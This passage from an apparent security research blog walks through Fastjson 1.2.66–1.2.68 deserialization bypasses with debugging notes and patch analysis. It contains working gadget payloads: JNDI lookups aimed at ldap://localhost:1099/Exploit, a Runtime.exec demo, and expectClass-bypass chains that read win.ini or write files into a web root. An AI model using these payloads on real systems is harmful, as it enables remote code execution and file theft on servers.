title="开启AutoTypeSupport时（触发漏洞）"></a>开启AutoTypeSupport时（触发漏洞）</h4><p>前面部分和之前差不多，来到关键部分，因为这次开启了AutoTypeSupport，所以可以进入TypeUtils#loadClass函数加载该类。</p><p><img src="/../../pict/image-20240622050206524.png" alt="image-20240622050206524"></p><p>通过AppClassLoader类加载器成功加载恶意类，且由于前面开启AutoType的缘故、cacheClass为true进而开启了cache缓存、使得恶意类缓存到了Mapping中，最后返回加载的类，之后跟之前调试第一条链差不多，反序列化该类，触发构造函数，getter或setter方法。</p><p><img src="/../../pict/image-20240622050319340.png" alt="image-20240622050319340"></p><h4 id="Gadget分析"><a href="#Gadget分析" class="headerlink" title="Gadget分析"></a>Gadget分析</h4><p>就两个方法，那调用的只能是无参构造函数了，并且调用了父类的有参构造函数。</p><p><img src="/../../pict/image-20240622051053200.png" alt="image-20240622051053200"></p><p>我们PoC中的AsText属性在JndiConverter类中并没有重写该属性的setter方法，但却调用了父类的AbstractConverter类的setAsText()函数来进行setter设置。并且为什么可以确认是这个属性呢，我们的走到jndi的lookup方法，这个方法在toObjectImpl方法里，可以直接找哪里调用了toObjectImpl方法也可以顺着一路找到setAsText()函数。</p><p><img src="/../../pict/image-20240622052052313.png" alt="image-20240622052052313"></p><h2 id="1-2-66反序列化漏洞（黑名单绕过"><a href="#1-2-66反序列化漏洞（黑名单绕过" class="headerlink" title="1.2.66反序列化漏洞（黑名单绕过"></a>1.2.66反序列化漏洞（黑名单绕过</h2><p>原理都大差不差，cv了一下mi1k7ea的文章作为笔记</p><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>新Gadget绕过黑名单限制。</p><p>1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。</p><p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="hljs-string">&quot;jndiNames&quot;</span>:[<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>], <span class="hljs-string">&quot;Realms&quot;</span>:[<span class="hljs-string">&quot;&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>&#125;<br>或<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;healthCheckRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="hljs-string">&quot;properties&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.util.Properties&quot;</span>,<span class="hljs-string">&quot;UserTransaction&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.66；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要包；</li><li>br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1099/Exploit\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;<br><span class="hljs-comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1099/Exploit\&quot;&#125;&quot;;</span><br><span class="hljs-comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1099/Exploit\&quot;&#125;&quot;;</span><br><span class="hljs-comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,&quot; +</span><br><span class="hljs-comment">//                &quot;\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1099/Exploit\&quot;&#125;&#125;&quot;;</span><br>        JSON.parse(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-67反序列化漏洞（黑名单绕过）"><a href="#1-2-67反序列化漏洞（黑名单绕过）" class="headerlink" title="1.2.67反序列化漏洞（黑名单绕过）"></a>1.2.67反序列化漏洞（黑名单绕过）</h2><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>新Gadget绕过黑名单限制。</p><p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="hljs-string">&quot;jndiNames&quot;</span>:[<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>], <span class="hljs-string">&quot;tm&quot;</span>: &#123;<span class="hljs-string">&quot;$ref&quot;</span>:<span class="hljs-string">&quot;$.tm&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>org.apache.shiro.jndi.JndiObjectFactory类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="hljs-string">&quot;resourceName&quot;</span>:<span class="hljs-string">&quot;ldap://localhost:1099/Exploit&quot;</span>,<span class="hljs-string">&quot;instance&quot;</span>:&#123;<span class="hljs-string">&quot;$ref&quot;</span>:<span class="hljs-string">&quot;$.instance&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="前提条件-2"><a href="#前提条件-2" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.67；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li></ul><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1099/Exploit\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://localhost:1099/Exploit\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-68反序列化漏洞（expectClass绕过AutoType）"><a href="#1-2-68反序列化漏洞（expectClass绕过AutoType）" class="headerlink" title="1.2.68反序列化漏洞（expectClass绕过AutoType）"></a>1.2.68反序列化漏洞（expectClass绕过AutoType）</h2><h3 id="前提条件-3"><a href="#前提条件-3" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>Fastjson &lt;&#x3D; 1.2.68；</li><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li></ul><h3 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>本次绕过<code>checkAutoType()</code>函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过<code>checkAutoType()</code>函数执行恶意操作。</p><p>简单地说，本次绕过<code>checkAutoType()</code>函数的攻击步骤为：</p><ol><li>先传入某个类，其加载成功后将作为expectClass参数传入<code>checkAutoType()</code>函数；</li><li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或<code>setter</code>方法中存在危险操作则可以被攻击利用；</li></ol><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>简单地验证利用expectClass绕过的可行性，先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">VulAutoCloseable</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>构造EXP如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;\n&quot;</span>;<br>        JSON.parse(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.example.VulAutoCloseable&quot;</span>,<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;calc&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>无需开启AutoType，直接成功绕过<code>CheckAutoType()</code>的检测从而触发执行：</p><h3 id="调试分析-5"><a href="#调试分析-5" class="headerlink" title="调试分析"></a>调试分析</h3><p>直接进checkAutoType函数，我们可以直接从mappings缓存中找到指定的<code>java.lang.AutoCloseable</code>类，</p><p><img src="/../../pict/image-20240622235932240.png" alt="image-20240622235932240"></p><p><img src="/../../pict/image-20240623000037832.png" alt="image-20240623000037832"></p><p>往下就是判断clazz是否不是expectClass类的继承类且不是HashMap类型，是的话抛出异常，否则直接返回该类。这里没有expectClass就直接返回<code>java.lang.AutoCloseable</code>类</p><p><img src="/../../pict/image-20240623000121534.png" alt="image-20240623000121534"></p><p>接着获取<code>java.lang.AutoCloseable</code>这个类的反序列化器，然后调用其deserialze方法开始反序列化。即JavaBeanDeserializer#deserialze</p><p><img src="/../../pict/image-20240623000229903.png" alt="image-20240623000229903"></p><p>往下的逻辑，就是根据给定的 <code>typeName</code> 获取一个对象反序列化器（<code>ObjectDeserializer</code>），如果该反序列化器不存在，则尝试根据类型信息和配置自动确定一个合适的反序列化器。调用配置对象的 <code>checkAutoType</code> 方法检查和自动确定给定类型名（<code>typeName</code>）是否允许并返回具体的用户类型。<code>expectClass</code> 是期望的类，<code>lexer.getFeatures()</code> 是一些特征或配置选项。</p><p><img src="/../../pict/image-20240623000354413.png" alt="image-20240623000354413"></p><p>往下，由于java.lang.AutoCloseable类并非其中黑名单中的类，因此expectClassFlag被设置为true</p><p><img src="/../../pict/image-20240623002351962.png" alt="image-20240623002351962"></p><p>往下，由于expectClassFlag为true且目标类不在内部白名单中，程序进入AutoType开启时的检测逻辑</p><p><img src="/../../pict/image-20240623002712935.png" alt="image-20240623002712935"></p><p>由于vul.VulAutoCloseable类不在黑白名单中，因此这段能通过检测并继续往下执行。</p><p>往下，未加载成功目标类，就会进入AutoType关闭时的检测逻辑，和上同理，这段能通过检测并继续往下执行</p><p>由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的</p><p><img src="/../../pict/image-20240623002958623.png" alt="image-20240623002958623"></p><p>跟进，使用了AppClassLoader加载vul.VulAutoCloseable类并直接返回加载的类。</p><p><img src="/../../pict/image-20240623003054223.png" alt="image-20240623003054223"></p><p>往下，判断是否jsonType、true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制。如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，<strong>这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断</strong>：</p><p><img src="/../../pict/image-20240623003222449.png" alt="image-20240623003222449"></p><p>checkAutoType()调用完返回类之后，就进行反序列化操作、新建恶意类实例进而调用其构造函数从而成功触发漏洞</p><p><strong>小结：</strong>当传入checkAutoType()函数的expectClass参数不为null，并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中），就将需要加载的目标类当做是正常的类然后通过调用TypeUtils.loadClass()函数进行加载。</p><h3 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h3><p>前面漏洞复现只是简单地验证绕过方法的可行性，在实际的攻击利用中，是需要我们去寻找实际可行的利用类的。</p><p>b1ue大佬文章中提出可以寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。</p><h4 id="复制文件（任意文件读取漏洞）"><a href="#复制文件（任意文件读取漏洞）" class="headerlink" title="复制文件（任意文件读取漏洞）"></a>复制文件（任意文件读取漏洞）</h4><p>利用类：<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;  <br> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  <br> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  <br> &lt;version&gt;<span class="hljs-number">1.9</span><span class="hljs-number">.5</span>&lt;/version&gt;  <br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>其<code>SafeFileOutputStream(java.lang.String, java.lang.String)</code>构造函数判断了如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中，可以利用造成任意文件读取。</p><p><img src="/../../pict/image-20240623012122118.png" alt="image-20240623012122118"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>, <span class="hljs-string">&quot;tempPath&quot;</span>:<span class="hljs-string">&quot;C:/Windows/win.ini&quot;</span>, <span class="hljs-string">&quot;targetPath&quot;</span>:<span class="hljs-string">&quot;D:/wamp64/www/win.txt&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><p>写内容类：<strong>com.esotericsoftware.kryo.io.Output</strong></p><p>依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Output类主要用来写内容，它提供了setBuffer()和setOutputStream()两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其flush()函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flush</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> KryoException &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.outputStream != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.outputStream.write(<span class="hljs-built_in">this</span>.buffer, <span class="hljs-number">0</span>, <span class="hljs-built_in">this</span>.position);<br>            <span class="hljs-built_in">this</span>.outputStream.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KryoException</span>(var2);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.total += (<span class="hljs-type">long</span>)<span class="hljs-built_in">this</span>.position;<br>        <span class="hljs-built_in">this</span>.position = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着，就是要看怎么触发Output类flush()函数了，flush()函数只有在close()和require()函数被调用时才会触发，其中require()函数在调用write相关函数时会被触发。</p><p>其中，找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其setBlockDataMode()函数中调用了drain()函数、drain()函数中又调用了out.write()函数，满足前面的需求，对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在。</p><p>但是Fastjson<em>优先获取</em>的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发了。</p><p>只有有参构造函数的ObjectOutputStream继承类：<strong>com.sleepycat.bind.serial.SerialOutput</strong></p><p>SerialOutput类的构造函数中是调用了父类ObjectOutputStream的有参构造函数，这就满足了前面的条件了。</p><p>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;<br>    &lt;artifactId&gt;je&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">5.0</span><span class="hljs-number">.73</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>PoC如下，用到了Fastjson循环引用的技巧来调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>    <span class="hljs-string">&quot;stream&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,<br>        <span class="hljs-string">&quot;targetPath&quot;</span>: <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span>,<br>        <span class="hljs-string">&quot;tempPath&quot;</span>: <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;writer&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,<br>        <span class="hljs-string">&quot;buffer&quot;</span>: <span class="hljs-string">&quot;cHduZWQ=&quot;</span>,<br>        <span class="hljs-string">&quot;outputStream&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.stream&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;position&quot;</span>: <span class="hljs-number">5</span><br>    &#125;,<br>    <span class="hljs-string">&quot;close&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>,<br>        <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,<br>        <span class="hljs-string">&quot;out&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;$ref&quot;</span>: <span class="hljs-string">&quot;$.writer&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看GitHub官方的diff，主要在ParserConfig.java中：<a href="https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a></p><p>在expectClass的判断逻辑中，对类名进行了Hash处理再比较哈希黑名单，并且添加了三个类</p><p>网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为：</p><table><thead><tr><th align="left">版本</th><th align="left">十进制Hash值</th><th align="left">十六进制Hash值</th><th align="left">类名</th></tr></thead><tbody><tr><td align="left">1.2.69</td><td align="left">5183404141909004468L</td><td align="left">0x47ef269aadc650b4L</td><td align="left">java.lang.Runnable</td></tr><tr><td align="left">1.2.69</td><td align="left">2980334044947851925L</td><td align="left">0x295c4605fd1eaa95L</td><td align="left">java.lang.Readable</td></tr><tr><td align="left">1.2.69</td><td align="left">-1368967840069965882L</td><td align="left">0xed007300a7b227c6L</td><td align="left">java.lang.AutoCloseable</td></tr></tbody></table><p>这就简单粗暴地防住了这几个类导致的绕过问题了。</p><h3 id="SafeMode"><a href="#SafeMode" class="headerlink" title="SafeMode"></a>SafeMode</h3><p>官方参考：<a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">https://github.com/alibaba/fastjson/wiki/fastjson_safemode</a></p><p>在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。所有的安全修复版本sec10也支持SafeMode配置。</p><p>代码中设置开启SafeMode如下：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">ParserConfig<span 